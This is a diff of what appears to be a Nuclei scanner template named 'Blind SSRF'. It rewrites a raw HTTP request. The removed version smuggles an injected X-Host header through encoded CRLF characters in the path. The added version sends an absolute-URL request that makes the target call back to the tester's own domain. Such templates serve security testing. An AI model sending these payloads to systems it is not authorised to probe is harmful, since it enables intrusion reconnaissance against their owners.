@@ -1,28 +1,22 @@
-id: 264
+id: 0x127
+
 info:
-  author: 0xAwali
   name: Blind SSRF
+  author: 0xAwali
   severity: info
+
 requests:
-- matchers:
-  - part: body
-    type: word
-    words:
-    - Your Match
-  raw:
-  - 'GET /%20HTTP/1.1%E5%98%8D%E5%98%8AX-Host:%20{{Host}}.{{Port}}.BSSRF-108.{{MY-DOMAIN}}%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A
-    HTTP/1.1
+  - raw:
+    - |+
+      GET {{Scheme}}://{{Host}}.{{Port}}.BSSRF-127.{{MY-DOMAIN}}/ HTTP/0.9
+      Cache-Control: no-transform
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+      Accept-Encoding: gzip, deflate
+      Accept: */*
 
-    Host: {{Hostname}}
-
-    Cache-Control: no-transform
-
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-
-    Accept-Encoding: gzip, deflate
-
-    Accept: */*
-
-
-    '
-  unsafe: true
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
